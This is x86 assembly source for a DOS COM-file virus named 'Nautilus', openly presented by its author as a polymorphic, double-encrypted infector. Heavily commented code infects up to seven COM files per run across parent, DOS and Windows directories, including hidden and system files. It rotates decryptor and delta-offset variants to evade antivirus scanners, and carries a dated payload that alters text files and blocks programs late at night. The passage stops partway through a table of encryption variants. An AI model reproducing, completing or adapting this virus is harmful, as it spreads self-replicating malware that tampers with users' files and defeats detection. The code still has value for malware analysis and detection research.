; NAME: Nautilus.com 
; TYPE: Appending
; ENCRYPTION: Yes ( Double Morphing )
; INFECTS: COM
; ROI: 7 files per run                       ( Rate Of Infection )
; RESIDENT: No
; POLYMORPH: Yes ( Encryption Routines/Calls and Offset Finder Change )
; STEALTH: No
; DT: Yes                                    ( Directory Transversal )
; REPAIRABLE: Yes
; PAYLOAD: Yes
; SIZE: 1,824 bytes
; AUTHOR: Sea4

; This is my finest creation so far. This is a polymorph with 131,072
; different variations of code, and then if you factor in the different
; XOR/ROR/ROL encryption values, it actually is more than 4*10^11 ( that
; is 400,000,000,000 ). It changes everything about itself that is not
; encrypted, so that the AV scanners have a hard time. It is named
; after the monstrous submarine in the Jules Verne book '20,000 Leagues Under
; the Sea'. It will activate on November 6 of every year, because its a
; significant day in the book. The bomb consists of writing a txt string to
; the end of all TXT files in the current directory, also on that day... no
; *.com files will run from 11pm to midnight and instead will display a text
; string. Some other significant things:
; 1) Will record its infector through the 'InfectedBy' variable
; 2) Saves the DTA so that command parameters passed to an infected
;    file are not lost.
; 3) Will infect all read only / hidden / system files and restore attributes
; 4) Will restore DATE/TIME stamps to victem files, and text files
; 5) Will infect Dos and Windows directories + plus any previous directories
;    of the one it was run from. And the .\windows\command directory too.
; 6) Will NOT destroy any infected files, and will restore Registers and
;    stack pointer before returning control.
; 7) Will NOT infect any files smaller than the Dropper, and none bigger
;    than 65,535-3*DropperSize
; 8) Will NOT infect more than 7 files per run
; 9) And it will randomly generate encryption/decryption values

;
;    - Sea4 of the CodeBreakers
;

start:
jmp  Virus_start         ; Jumps to the start of the virus. This
                         ; will change as the virus is appended to
                         ; different size files.
Virus_start:
call Delta               ; Now we have to get the delta offset. By
                         ; calling Delta we push the address of 'pop bp'
                         ; onto the stack.
Delta:
pop  ax                  ; Put the address into BP so it can be used.
sub  ax,offset delta     ; Now this takes the distance that Delta is now
nop                      ; Occupy space so that this
nop                      ; takes up 10 bytes
xchg bp,ax               ; now (BP) and subtracts where it started
                         ; (Offset Delta). Understand?? Hopefully you do!
                         ; Because most files are different sizes, and this
                         ; virus just attaches itself to the end we have
                         ; to find out where it is before it can do anything.

Decrypt:                 ; This is one spot modified by the Morphing

mov  cx,cryptie-hidden   ; Give length of area to decrypt to CX
lea  si,[bp+hidden]      ; Start of area to decrypt
mov  di,si               ; its also the destination for decrypted part
mov  dl,[bp+DecVal1]     ; Stores Decryption Value in dl
mov  dh,[bp+Xor1val]     ; Xor Value to be used in this call
nop                      ; 1 byte to make space for morphing
call Cryptie             ; Decrypts the virus from here to the decryption
                         ; routine.

Hidden:                  ; Only encrypted once, because this is the decrypt
                         ; call for the second layer. This is modyfied by
                         ; the Morphing.

mov  cx,DCryptie-Dhidden ; Gets the size for the next area to decrypt
lea  si,[bp+Dhidden]     ; Puts the starting address of the secong layer of
                         ; encryption into DI
mov  di,si               ; Then SI
mov  dl,[bp+DecVal2]     ; Decryption code value
mov  dh,[bp+Xor2Val]     ; Xor Value to be used by this call
nop                      ; 1 byte to take up space for morphing
call DCryptie            ; Boom! Decrypts the second layer

DHidden:                 ; Area that is hidden with Double encryption
                           
; Here we will write the saved bytes from the beggining of the file, back
; to where they belong, so that we may run the file as normal, after we
; infect some more files of course :)

lea  di,100h             ; We are gonna write the saved bytes to the start
                         ; so we run the program as normal after we infect
                         ; some files.
mov  cx,03h              ; The number of bytes we have to write back to start
lea  si,[bp+saved]       ; Notice the [bp+saved]. It accesses a memory locale
                         ; that would be changed depending on infected file
                         ; size. We just add our Delta offset to find out
                         ; its exact location.
rep  movsb               ; Quickly restores the file so we can run it after
                         ; we get through here.

; Save the DTA
NewDTA    EQU Buffer+VirL
; It will be after the buffer needed for copying the virus

lea  di,[bp+NewDTA]      ; Puts the DTA after the buffer used by copying
                         ; the virus.
mov  si,80h              ; DTA area that we must save
mov  cx,2Ah              ; Length of DTA = 42d bytes ( 2Ah )
rep  movsb               ; Puts it in a safe place

; Save the current directory so that control is restored in the
; right place after the virus has run.
mov  ah,47h              ; Function 47h: Get Current Directory
xor  dx,dx               ; 00h in DL = Default Drive
lea  si,[bp+CurDIR]      ; 64 byte buffer for pathname
int  21h                 ; Calls DOS to write current DIR to CurDIR


; Put the name of this file into 'Infectedby' so that
; the victem file knows who infected it :) MyName will be
; set when each file is found.

lea  si,[bp+MyName]      ; Name of the running file
lea  di,[bp+Infectedby]  ; Place where the victems will see their infector
mov  cx,0Dh              ; 0Dh bytes, length of name
rep  movsb               ; Moves it by bytes

pusha
call InfectDir           ; Umm, maybe it infects the directory, I am not
                         ; sure though.
popa

Chg_Dot_Dot:   ; Go to '..' all the way to root dir infecting along the way
mov  ah,3Bh              ; Function 3Bh: Change Directory
lea  dx,[bp+dot_dot]          ; Dot_Dot mask
int  21h                 ; Calls DOS to go back 1 directory
jc   Go_DOS              ; Change Directory to DOS because it has a few
                         ; frequently used COM files
pusha
call InfectDir           ; Umm, maybe it infects the directory, I am not
                         ; sure though.
popa
jmp  Chg_Dot_Dot         ; Do again, till we hit root directory

Go_DOS:        ; Go to DOS
mov  ah,3Bh              ; Function 3Bh: Change Directory
lea  dx,[bp+dos_mask]         ; DOS
int  21h                 ; Calls DOS to go back 1 directory
jc   Windows   

pusha
call InfectDir           ; Umm, maybe it infects the directory, I am not
                         ; sure though.
pusha

Windows:                 ; Infect Windows DIR
; Got to move back to ROOT
mov  ah,3Bh              ; Function 3Bh: Change Directory
lea  dx,[bp+dot_dot]     ; Dot_Dot mask
int  21h                 ; Calls DOS to go back 1 directory

mov  ah,3Bh              ; Function 3Bh: Change Directory
lea  dx,[bp+win_mask]    ; win mask
int  21h                 ; Open windows DIR
jnc  InfectWin             
jmp  WinCom

InfectWin:
pusha
call InfectDir           ; Umm, maybe it infects the directory, I am not
                         ; sure though.
popa

WinCom:                  ; Infect .\windows\command
mov  ah,3Bh              ; Function 3Bh: Change Directory
lea  dx,[bp+win_com]     ; command directory mask
int  21h                 ; Open command directory
jnc  InfWinCom
jmp  BadStuff

InfWinCom:
pusha
call InfectDir           ; Umm, maybe it infects the directory, I am not
                         ; sure though.
popa
jmp  BadStuff

SavedDTAs EQU  NewDTA+2Ah

InfectDir:
mov  ax,4E00h            ; Function 4Eh: Find First
Findnext:                ; Findnext jmp point
lea  dx,[bp+filemask]    ; Gets the filemask = '*.com',0
mov  cx,07h              ; Find all file types
int  21h                 ; Tells DOS to find the *.com files

jnc  Open                ; Found one, now open it!

ret                      ; NONE left, lets jump back to changing directories

Open:          ; Open/Encrypt/Infect routines



; Now we have to retrieve the name of the file to be infected
; so that we may put it into the MyName variable. The reason
; it is done this way is to delete extra characters that may
; have been left from longer filenames. :)

mov  si,9Eh         ; ASCIZ filename
lea  di,[bp+MyName] ; Name of the file to be infected
mov  cx,0Dh         ; 0Dh (13d) bytes, name length
GetName:
lodsb               ; Gets the next char of name
cmp  al,00h         ; Checks to see if the name is done
je   DelRest        ; If the name is done we blank out the other chars
stosb               ; Store the character into MyName
loop GetName        ; Gets the whole name this way 

Delrest:
rep stosb           ; Pushes 00h into the remaining chars if the filename
                    ; is done before 13 chars

; Save attributes, then set them to 0, so we can
; modify this file. They are restored at 'Close'

lea  si,[95h]       ; Start of file attributes
mov  cx,09h         ; CX is enough to read: Attrib/Time/Date/Size
lea  di,[bp+s_attr] ; Place to save all the file attribs
rep  movsb          ; Moves em to their new home ( to be restore later )

; Set attrib to 0
lea  dx,[9Eh]       ; Filename in DTA
mov  ax,4301h       ; Function 4301h: Set File Attributes
xor  cx,cx          ; Clear file attribs
int  21h            ; Calls DOS to do 'our dirty work'

mov  ax,3D02h       ; Function 3Dh: Open File
                    ; 02 = Read/Write access
mov  dx,9Eh         ; Location of ASCIZ filename
int  21h            ; Calls DOS to open the file, with Read/Write access
                    ; so that we can write the virus to it :)

xchg bx,ax          ; Gives the file handle from AX to BX in one byte.

mov  ah,3Fh         ; Function 3Fh: Read from file
mov  cx,03h         ; We are gonna read the first 3 bytes. CX = # of bytes
                    ; to read from file.
lea  dx,[bp+saved]  ; The location for the bytes to be stored when read.
int  21h            ; Calls DOS to load the first 3 bytes of Victem file
                    ; into the 'Saved' location so that it may run correctly.

mov  al,0E9h        ; Checks to see if it was a jump instruction
cmp  al,[bp+saved]  ; by matching E9h to the first byte of the file.
jne  Uninfected     ; It can't be infected by this virus because the file
                    ; has NO jmp at its beggining.
mov  ax,[80h+1Ah]   ; Gets filesize
sub  ax,Virl+3           ; subtracts JMP size and Virus Size
cmp  ax,[bp+saved+1]     ; See if the file is infected by THIS virus
jne  Uninfected          

Close:
jmp  Infected

Uninfected:

; Check if file meets requirements for infection

mov  ax,[9Ch]       ; Get file offset size
cmp  ax,0           ; see if its = 0
jnz  Close          ; If the file is larger than 64k we can't infect it,
                    ; plus it might command.com or some other important file.

Filesize EQU Buffer-Start

mov  ax,[80h+1Ah]   ; Gets the filesize of the target file
cmp  ax,FileSize    ; If file is smaller than the 1st Gen. file, it is safe
jc   Close          ; so we jump to close

cmp  ax,0FFFFh-(3*FileSize) ; If file is larger than AX 
jnc  Close          ; Errors may occur

sub  ax,03h         ; Takes into account the length of the JMP instruction
mov  [bp+jumpto],ax ; Puts the location to jmp to as the
                    ; 2nd,3rd bytes of the buffer.

; Call Morph, changes the encryption routines and calls
push bx             ; Saves BX
call Morph          ; Calls the morphing routine
pop  bx             ; Retrieves BX

mov  ax,4200h       ; Function 42h: Move File Pointer
                    ; 00h = beggining, after the read the FP moves 3 bytes
xor  cx,cx          ; 0 = CX
xor  dx,dx          ; 0 = DX
int  21h            ; Calls DOS, this is explained a bit more with the
                    ; next "Move File Pointer" instruction

mov  ah,40h         ; Function 40h: Write to file
mov  cx,03          ; Number of bytes to write. CX = # of bytes
lea  dx,[bp+jumping]; Start at buffer area, this will write the jump
                    ; instruction to the beggining of the victem file.
int  21h            ; Blammo! This is the jmp that skips over the normal
                    ; file and heads write to the virus code. INT 21h tells
                    ; DOS to write those three bytes.

mov  ax,4202h       ; Function 42h: Move File pointer
                    ; 02 = End of file ( EOF )
xor  cx,cx          ; DX:CX is the offset from the File pointer location,
xor  dx,dx          ; since we want to be exactly at the EOF we clear DX:CX
int  21h            ; Calls DOS to move the file pointer

; Write the Virus to memory

VirL EQU  Ende-Virus_Start

; Length of Virus except jmp at beggining

lea  si,[bp+Virus_Start] ; Start of virus
lea  di,[bp+buffer]      ; Area that it will be stored in mem
mov  cx,VirL             ; Length of it
rep  movsb

; Now we have to modify it so that it is encrypted  

DHiddenL  EQU  DCryptie-DHidden    ; Length of area to encrypt that will
                                   ; end up double encrypted.
HiddenL   EQU  Cryptie-Hidden      ; Length of single encrypt area
DHBufStart EQU  DHidden-Virus_Start+Buffer   ; Start of DHidden in buffer
HBufStart EQU  Hidden-Virus_Start+Buffer     ; Start of Hidden in Buffer

; More ways to clear up the clutter

; Here we encrypt All but the second and first Decrypt calls, and the
; decryption routines that go with em.

lea  si,[bp+DHBufStart]  ; Time to encrypt the first area that will then
mov  di,si               ; be encrypted again, giving us our Doubly Encrypted
                         ; area.
mov  cx,DHiddenL         ; Length of this area
mov  dl,[bp+EncVal2]     ; ROL/ROR value
mov  dh,[bp+Xor2Val]     ; Xor value
call DCryptie            ; Calls the Second Encryption routine
                         ; because this will become decrypted by the first
                         ; when infected files are run.

; Now we encrypt from Hidden to Cryptie ( while encrypting DHidden to
; DCryptie for the second time ) which makes this double encrypting.

lea  si,[bp+HBufStart]   ; Start of Hidden area in buffer
mov  di,si               ; You should know this one by now.
mov  dl,[bp+EncVal1]     ; ROR/ROL value
mov  dh,[bp+Xor1Val]     ; Xor value
mov  cx,HiddenL          ; Length of the area
call Cryptie             ; Uhoh, now its encrypted and the AV software won't
                         ; find it. Now what are we gonna do?
                         ; ( Being sarcastic of course! )

; So we have the virus prepared for infecting :)

mov  ah,40h              ; Function 40h: Write to file ( everyone's fave )
lea  dx,[bp+buffer]      ; Start of virus in mem buffer
mov  cx,VirL             ; Length of it
int  21h                 ; Calls DOS to write this :)

inc  byte ptr [bp+victems] ; Increase victem #

Infected:           ; A place to jump in case the file is already infected

mov  ax,5701h       ; Function 5701h: Set File's Last - Written Date and Time
mov  dx,word ptr [bp+s_date]  ; DX = Date
mov  cx,word ptr [bp+s_time]  ; CX = Time
int  21h            ; More Dirty work for DOS

mov  ah,3Eh         ; Function 3Eh: Close File
int  21h            ; Calls DOS to close up the file.

mov  ax,4301h       ; Function 4301h: Set File Attributes
lea  dx,[9Eh]       ; Filename in DTA
xor  cx,cx          ; Clears CX
mov  cl,byte ptr [bp+s_attr] ; Puts the attributes into CL
int  21h            ; Isn't DOS just sooooo helpful. 

cmp  byte ptr [bp+Victems],07h ; Check to see if 7 files have been infected.

je   BadStuff       ; Place where the bomb will be dropped

mov  ax,4F00h       ; Function 4Fh: Find next
jmp  Findnext

Badstuff:           ; Here is where the payload goes
; This is a real simple payload
; It will go off on the day that the Abraham Lincoln was rammed by the
; Nautilus submarine in the book 20,000 Leagues Under The Sea.
; It will then print a text string to the end of all text files in the
; current directory, and display a message and no *.com files will run
; from 11pm to midnight because that is around the time of day it happened
; ( in the book at least ), its fiction in case you were wondering
Go_Root:            ; Takes us to root
mov  ah,3Bh         ; Function 3Bh: Change Directory
lea  dx,[bp+dot_dot] ; '..' back a directory
int  21h            ; Hey DOS, lets go to the ROOT Directory
jnc  Go_root        ; Loops til we hit the root

; Now We head back to the directory we started in by getting the
; CurDIR variable from its buffer
mov ah,3Bh          ; Function 3Bh: Change Directory
lea  dx,[bp+CurDIR] ; Saved starting directory
int  21h
jnc  DropBomb       ; It was successful
jmp  Exit           ; For whatever reason we were not able to get there
                    ; so we should exit

DropBomb:
mov  ah,04h         ; Function 04h: Get Real Time Clock ( Date )
int  1Ah            ; INT 1Ah BIOS Time interrupt
                    ; Gets the date and puts the value into the following
                    ; registers.
          ; CH = Century
          ; CL = Year
          ; DH = Month
          ; DL = Day

cmp  dx,1106h  ; The day that the Nautilus rammed Professor Arronax's ship
je   WriteText ; Only activate on this day
jmp  Exit      ; Otherwise get out of here

WriteText:
mov  ah,4Eh         ; Function 4Eh: Find First
FindNextText:
lea  dx,[bp+textmask]    ; Gets the text file mask
mov  cx,07h              ; all file attributes
int  21h                 ; Tells DOS to get us the file
jnc  OpenText
jmp  FindTime

OpenText:
lea  si,[95h]       ; Start of file attributes
mov  cx,09h         ; CX is enough to read: Attrib/Time/Date/Size
lea  di,[bp+s_attr] ; Place to save all the file attribs
rep  movsb          ; Moves em to their new home ( to be restore later )

; Set attrib to 0
lea  dx,[9Eh]       ; Filename in DTA
mov  ax,4301h       ; Function 4301h: Set File Attributes
xor  cx,cx          ; Clear file attribs
int  21h            ; Calls DOS to do 'our dirty work'

mov  ax,3D01h       ; Function 3Dh: Open File
                    ; 01h = for write access
mov  dx,9Eh         ; ASCIZ Filename in DTA
int  21h            ; Calls DOS to tear that baby open!

xchg bx,ax          ; Puts file handle in BX

mov  ax,4202h       ; Function 42h: Move File Pointer
                    ; 02 = End Of File (EOF)
xor  cx,cx          ; 0
xor  dx,dx          ; 0
int  21h            ; Once we get to the end of thew file we can write our
                    ; string to it, without damaging anything

mov  ah,40h         ; Function 40h: Write to file
lea  dx,[bp+line1]  ; Puts the string start address into DX
mov  cx,Textlen     ; Puts the text length into CX
int  21h            ; Writes that baby

mov  ax,5701h       ; Function 5701h: Set File's Last - Written Date and Time
mov  dx,word ptr [bp+s_date]  ; DX = Date
mov  cx,word ptr [bp+s_time]  ; CX = Time
int  21h            ; More Dirty work for DOS

mov  ah,3Eh         ; Function 3Eh: Close File
int  21h            ; Calls DOS to close up the file.

mov  ax,4301h       ; Function 4301h: Set File Attributes
lea  dx,[9Eh]       ; Filename in DTA
xor  cx,cx          ; Clears CX
mov  cl,byte ptr [bp+s_attr] ; Puts the attributes into CL
int  21h            ; Isn't DOS just sooooo helpful. 

mov  ax,4F00h       ; Find next
jmp  FindNextText   ; Gets the next one

FindTime:
mov  ah,02h         ; Function 02h: Get Real Time Clock ( Time )
int  1Ah            ; Retrieves the time and puts the values into the
                    ; following registers
     ; CH = Hour
     ; CL = Minutes
     ; DH = Seconds
     ; DL = Daylight Savings Flag ( 0h = standard time; 1h = daylight time )

cmp  cx,2300h       ; 11:00pm ( about the time it was rammed )
jb   exit           ; If before 11 we are safe, otherwise ...

mov  ah,09h         ; Function 09h: Print String Standard Output
lea  dx,[bp+Message1]    ; Location of string
int  21h            ; Calls DOS

int  20h            ; Close Program

message1  db   'Thus ends the voyage under the seas.','$'

exit:

; Lets set the DTA back to what it should be so that the program can
; can use any parameters passed to it.

lea  si,[bp+NewDTA]      ; Area that DTA was saved
mov  di,80h              ; Area where it was
mov  cx,2Ah              ; Length of DTA
rep  movsb               ; Put it back


; Now we are gonna get outta here, first we should cover up any stuff
; that might show up in a mem dump, so that if anyone looks, all they
; see is garbage.
HideEnde   EQU  2Ah+VirL+Buffer-Ende

lea  si,[bp+Ende]        ; We are gonna encrypt from Ende to end of DTA
mov  di,si               ; So it is hidden along with the Virus itself
mov  dl,[bp+EncVal2]     ; Rotate value
mov  dh,[bp+Xor2Val]     ; Xor value
mov  cx,HideEnde         ; Length of buffer area used + DTA area :)
call DCryptie            ; Calls 2nd encrypt routine

lea  di,[bp+EndRet]      ; Loads start of routine that returns control
mov  si,di               ; to host program, into DI/SI
mov  dl,[bp+EncVal1]     ; Gets encryption value for DL
mov  dh,[bp+Xor1Val]     ; Gets XOR value for DH
mov  cx,DoneRet-EndRet   ; length to encrypt
call Cryptie             ; Calls the encryptor. We encrypt this so it is the
                         ; only thing left after the next call. Understand?

lea  di,[bp+Virus_Start] ; Gets the location of the Virus_start and hides
                         ; everything but the encryption itself. ( and the
                         ; kitchen sink, of course )
mov  si,di               ; and put it into DI/SI so we can hide the virus
                         ; from the host program.
mov  dl,[bp+DecVal1]     ; Rotate value
mov  dh,[bp+Xor1Val]     ; Xor value
mov  cx,Cryptie-Virus_start ; Gives length of area to hide into CX
call cryptie             ; Calls the encryption loop to hide it


EndRet:                  ; Jumps to the start of the actual program.
                         ; But first, lets reset all registers so no
                         ; problems are caused by a program assuming 0
                         ; registers.
xor  sp,sp               ; resets the stack pointer
push sp                  ; and pushes 0 onto the stack
xor  di,di
xor  si,si
;xor cx,cx               ; CX is 0 by the call to Cryptie
xor  ax,ax
xor  bx,bx
xor  dx,dx
xor  bp,bp
push 100h                ; Puts 100h on stack
ret                      ; Jumps to location on stack ( 100h )
DoneRet:


jumping   db   0E9h           ; E9 = jmp
jumpto    db   0,0            ; Place for the new address

; Dec/Enc values are here for the Morphing aspect, so that
; whatever type of decryption/encryption is used the values will
; always be found here.


Morph:              ; This will move different ( preset ) Encryption
                    ; Routines and Calls into their respective spots.
                    ; It will also Change the Delta offset thing, because
                    ; that is a dead giveaway to the virus and is just dying
                    ; to become a scanstring.

; Get New Enc/Dec Values
in   al,40h              ; Get random number from port 40h
and  al,7h               ; Masks out all but first 3 bits
jnz  NotZero             ; If its not zero, we are good.
inc  al                  ; Makes any 0 = 1
NotZero:                 
mov  [bp+EncVal1],al     ; Saves it as the EncVal1
neg  ax                  ; gets the opposite of AL
and  al,7h               ; Makes EncVal1 + DecVal1 = 8
mov  [bp+DecVal1],al     ; Saves the DecVal1

in   al,40h              ; Get random number from port 40h
and  al,7h               ; Masks out all but first 3 bits
jnz  NotZero2            ; If its not zero, we are good.
inc  al                  ; Makes any 0 = 1
NotZero2:                 
mov  [bp+EncVal2],al     ; Saves it as the EncVal2
neg  ax                  ; gets the opposite of AL
and  al,7h               ; Makes EncVal2 + DecVal2 = 8
mov  [bp+DecVal2],al     ; Saves the DecVal2

; Get XorValues
Xoragain:
in   al,40h              ; Random number from port 40h
xchg bx,ax               ; saves it into BL
in   al,40h              ; Gets another
cmp  al,bl               ; Makes sure they are not the same
                         ; because they might decrypt each other
                         ; in Cryptie and DCryptie, depending on
                         ; how they turn out.
jz   XorAgain            ; If they are equal, try again
mov  [bp+Xor1Val],al     ; Save it as Xor1Val
mov  [bp+Xor2Val],bl     ; Save it as Xor2Val

; Now, the above got us some values to use, all we have to do, is
; modify how they are used. For the decrypt calls, and routines, we just
; randomly choose from a list of possibles.

xor  dx,dx
GetDelta:           ; Get a possible Delta Offset Thingy
mov  dl,0Ah  
lea  di,[bp+Virus_Start]
lea  si,[bp+PosDelta]
in   al,40h              ; Gets Random Number
and  al,7h               ; Makes it 7 or less
imul dl                  ; Multiplies AL by 0Ah and stores in AX
add  si,ax               ; Adds AX to SI so we can get one of the possible
                         ; morphs for getting the delta offset.
mov  cx,dx               ; Length of Delta Offset Morphs
rep  movsb               ; MORPHING TIME!!

GetCC:              ; Get a possible Call Cryptie
mov  dl,12h              ; Size of Call Cryptie Morphs
lea  di,[bp+Decrypt]
lea  si,[bp+PosCC]
in   al,40h              ; Gets Random Number
and  al,7h               ; Makes it 7 or less
imul dl                  ; Multiplies AL by 12h and stores in AX
add  si,ax               ; Adds AX to SI so we can get one of the possible
                         ; morphs for calling Cryptie.
mov  cx,dx               ; Length of Call Cryptie Morphs
rep  movsb               ; MORPHING TIME!!

GetCDC:             ; Get one of the possible Call DCryptie's
mov  dl,12h              ; Size of Call DCryptie Morphs
lea  di,[bp+Hidden]
lea  si,[bp+PosCDC]
in   al,40h              ; Gets Random Number
and  al,7h               ; Makes it 7 or less
imul dl                  ; Multiplies AL by 12h and stores in AX
add  si,ax               ; Adds AX to SI so we can get one of the possible
                         ; morphs for calling DCryptie.
mov  cx,dx               ; Length of Call DCryptie Morphs
rep  movsb               ; MORPHING TIME!!

GetCR:                   ; Get 2 new encryption routines
mov  dx,0Eh              ; Size of each possible encryption routine
lea  di,[bp+MorphD1]     ; Start of first encryption routine to change
lea  si,[bp+PosCR]       ; Start of possible variants
in   al,40h              ; Gets a random number
and  al,0Fh              ; Makes it 0Fh or less
imul dl                  ; Multiplies 0Eh by the Random # and stores in AX
add  si,ax               ; Gets the offset of encryption variant and puts
                         ; it into the SI
mov  cx,dx               ; Gives count of encryption length to CX
rep  movsb               ; Quickly does the first of two

mov  dx,0Eh              ; Size of each possible encryption routine
lea  di,[bp+MorphD2]     ; Start of second encryption routine to change
lea  si,[bp+PosCR]       ; Start of possible variants
in   al,40h              ; Gets a random number
and  al,0Fh              ; Makes it 0Fh or less
imul dl                  ; Multiplies 0Eh by the Random # and stores in AX
add  si,ax               ; Gets the offset of encryption variant and puts
                         ; it into the SI
mov  cx,dx               ; Gives count of encryption length to CX
rep  movsb               ; Quickly does the second one

ret                 ; Goes back to the spot that called here

; Below is a Database of possible morphs
; The same results are reached by using any of these morphs
; they are just there to fool AV software companies.

PosDelta:           ; Possible Delta Routines, size 10 bytes
db   0E8,00,00                ; 3       ; Call Delta
sti                           ; 1 
pop  bp                       ; 1
xchg bx,ax                    ; 1
sub  bp,offset delta          ; 4
                              ; = 10
PosDelta2:
sti                           ; 1
clc                           ; 1
db   0E8h,0,0                 ; 3
pop  ax                       ; 1
sub  ax,offset delta +2       ; 3
xchg bp,ax                    ; 1
                              ; = 10
PosDelta3:
cli                           ; 1
db   0E8h,0,0                 ; 3
pop  ax                       ; 1
sti                           ; 1
sub  ax,offset delta+1        ; 3
xchg bp,ax                    ; 1
                              ; = 10
PosDelta4:
cld                           ; 1
db   0E8h,0,0                 ; 3
pop  bp                       ; 1
clc                           ; 1
sub  bp,offset delta+1        ; 4
                              ; = 10
PosDelta5:
db   0E8h,0,0                 ; 3
pop  bx                       ; 1
sti                           ; 1
xchg bx,ax                    ; 1
sub  ax,offset delta          ; 3
xchg bp,ax                    ; 1
                              ; = 10
PosDelta6:
sti                           ; 1
nop                           ; 1
db   0E8h,0,0                 ; 3
pop  bp                       ; 1
sub  bp,offset delta+2        ; 4
                              ; = 10
PosDelta7:
db   0E8h,0,0                 ; 3
pop  ax                       ; 1
xchg bx,ax                    ; 1
xchg bx,ax                    ; 1
sub  ax,offset delta          ; 3
xchg bp,ax                    ; 1
                              ; = 10
PosDelta8:
db   0E8h,0,0                 ; 3
nop                           ; 1
pop  ax                       ; 1 
nop                           ; 1
sub  ax,offset delta          ; 3
xchg bp,ax                    ; 1
                              ; = 10

PosCC:              ; Possible Call Cryptie, size 12h ( 18d ) bytes
mov  cx,cryptie-hidden        ; 3
lea  si,[bp+hidden]           ; 4
nop                           ; 1
mov  di,si                    ; 2
mov  dl,[bp+DecVal1]          ; 4
mov  dh,[bp+Xor1val]          ; 4
                              ; = 18

PosCC2:
lea  di,[bp+hidden]           ; 4
nop                           ; 1
mov  dl,[bp+DecVal1]          ; 4
mov  cx,cryptie-hidden        ; 3
mov  dh,[bp+Xor1val]          ; 4
mov  si,di                    ; 2
                              ; = 18
PosCC3:
sti                           ; 1
lea  si,[bp+hidden]           ; 4
mov  dh,[bp+Xor1val]          ; 4
mov  di,si                    ; 2
mov  dl,[bp+DecVal1]          ; 4
mov  cx,cryptie-hidden        ; 3
                              ; = 18
PosCC4:
lea  di,[bp+hidden]           ; 4
mov  cx,cryptie-hidden        ; 3
clc                           ; 1
mov  si,di                    ; 2
mov  dh,[bp+Xor1val]          ; 4
mov  dl,[bp+DecVal1]          ; 4
                              ; = 18
PosCC5:
mov  dl,[bp+DecVal1]          ; 4
mov  dh,[bp+Xor1val]          ; 4
mov  cx,cryptie-hidden        ; 3
lea  si,[bp+hidden]           ; 4
mov  di,si                    ; 2
nop                           ; 1
                              ; = 18
PosCC6:
mov  dh,[bp+Xor1val]          ; 4
lea  si,[bp+hidden]           ; 4
cld                           ; 1
mov  cx,cryptie-hidden        ; 3
mov  di,si                    ; 2
mov  dl,[bp+DecVal1]          ; 4
                              ; = 18
PosCC7:
mov  cx,cryptie-hidden        ; 3
nop                           ; 1
mov  dl,[bp+DecVal1]          ; 4
mov  dh,[bp+Xor1val]          ; 4
lea  di,[bp+hidden]           ; 4
mov  si,di                    ; 2
                              ; = 18
PosCC8:
mov  dl,[bp+DecVal1]          ; 4
lea  si,[bp+hidden]           ; 4
mov  cx,cryptie-hidden        ; 3
stc                           ; 1
mov  di,si                    ; 2
mov  dh,[bp+Xor1val]          ; 4
                              ; = 18

PosCDC:             ; Possible Call DCryptie, size 12h ( 18d ) bytes
mov  cx,DCryptie-Dhidden      ; 3
lea  si,[bp+Dhidden]          ; 4
mov  di,si                    ; 2
nop                           ; 1
mov  dl,[bp+DecVal2]          ; 4
mov  dh,[bp+Xor2Val]          ; 4
                              ; = 18

PosCDC2:
lea  si,[bp+Dhidden]          ; 4
mov  dh,[bp+Xor2Val]          ; 4
mov  di,si                    ; 2
clc                           ; 1
mov  cx,DCryptie-Dhidden      ; 3
mov  dl,[bp+DecVal2]          ; 4
                              ; = 18

PosCDC3:
mov  dh,[bp+Xor2Val]          ; 4
mov  dl,[bp+DecVal2]          ; 4
lea  si,[bp+Dhidden]          ; 4
nop                           ; 1
mov  di,si                    ; 2
mov  cx,DCryptie-Dhidden      ; 3
                              ; = 18

PosCDC4:
lea  di,[bp+Dhidden]          ; 4
sti                           ; 1
mov  dl,[bp+DecVal2]          ; 4
mov  si,di                    ; 2
mov  cx,DCryptie-Dhidden      ; 3
mov  dh,[bp+Xor2Val]          ; 4
                              ; = 18

PosCDC5:
cld                           ; 1
lea  si,[bp+Dhidden]          ; 4
mov  cx,DCryptie-Dhidden      ; 3
mov  di,si                    ; 2
mov  dh,[bp+Xor2Val]          ; 4
mov  dl,[bp+DecVal2]          ; 4
                              ; = 18

PosCDC6:
lea  si,[bp+Dhidden]          ; 4
mov  cx,DCryptie-Dhidden      ; 3
mov  dl,[bp+DecVal2]          ; 4
nop                           ; 1
mov  dh,[bp+Xor2Val]          ; 4
mov  di,si                    ; 2
                              ; = 18

PosCDC7:
lea  di,[bp+Dhidden]          ; 4
mov  cx,DCryptie-Dhidden      ; 3
mov  si,di                    ; 2
mov  dh,[bp+Xor2Val]          ; 4
cld                           ; 1
mov  dl,[bp+DecVal2]          ; 4
                              ; = 18

PosCDC8:
mov  dh,[bp+Xor2Val]          ; 4
mov  dl,[bp+DecVal2]          ; 4
nop                           ; 1
lea  di,[bp+Dhidden]          ; 4
mov  si,di                    ; 2
mov  cx,DCryptie-Dhidden      ; 3
                              ; = 18

PosCR:              ; Possible Cryptie Routines, each 14 bytes
neg  al                       ; 2
xor  al,13h                   ; 2
not  al                       ; 2
rol  al,cl                    ; 2
not  al                       ; 2
xor  al,13h                   ; 2
neg  al                       ; 2
                              ; = 14

Pos2CR:             ; Possible DCryptie Routines, each 14 bytes
xor  al,72h                   ; 2
neg  al                       ; 2
rol  al,cl                    ; 2
not  al                       ; 2
rol  al,cl                    ; 2
neg  al                       ; 2
xor  al,72h                   ; 2
                              ; = 14

PosCR2:
neg  al                       ; 2
sti                           ; 1
rol  al,cl                    ; 2
nop                           ; 1
clc                           ; 1
neg  al                       ; 2
rol  al,cl                    ; 2
cld                           ; 1
neg  al                       ; 2
                              ; = 14

Pos2CR2:
rol  al,cl                    ; 2
sti                           ; 1
xor  al,0C4h                  ; 2
ror  al,cl                    ; 2
stc                           ; 1
nop                           ; 1
xor  al,0C4h                  ; 2
clc                           ; 1
rol  al,cl                    ; 2
                              ; = 14

PosCR3:
not  al                       ; 2
xor  al,0AAh                  ; 2
stc                           ; 1
nop                           ; 1
clc                           ; 1
neg  al                       ; 2
xor  al,0AAh                  ; 2
sti                           ; 1
not  al                       ; 2
                              ; = 14

Pos2CR3:
ror  al,cl                    ; 2
cmp  al,cl                    ; 2
stc                           ; 1
xor  al,ch                    ; 2
ror  al,cl                    ; 2
xor  al,ch                    ; 2
cld                           ; 1
ror  al,cl                    ; 2
                              ; = 14

PosCR4:
rol  al,cl                    ; 2
neg  al                       ; 2
nop                           ; 1
xor  al,55h                   ; 2
sti                           ; 1
neg  al                       ; 2
std                           ; 1
